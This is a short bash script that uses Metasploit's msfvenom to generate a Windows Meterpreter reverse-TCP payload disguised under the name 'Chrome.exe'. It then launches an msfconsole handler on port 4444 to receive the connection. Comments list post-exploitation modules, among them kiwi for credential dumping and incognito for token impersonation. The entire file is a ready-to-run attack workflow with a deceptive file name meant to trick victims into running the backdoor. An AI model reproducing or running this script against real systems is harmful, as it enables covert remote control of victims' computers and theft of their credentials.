#!/usr/bin/env bash
echo "enter ip"
# shellcheck disable=SC2162
read ip

/opt/metasploit-framework/bin/msfvenom -p windows/meterpreter/reverse_tcp lhost="$ip" lport=4444 -f exe -o /Users/matanmishali/Downloads/Chrome.exe
/opt/metasploit-framework/bin/msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set lport 4444; set lhost $ip; exploit"

# use powershell
# use kiwi
# use incognito
# powershell_shell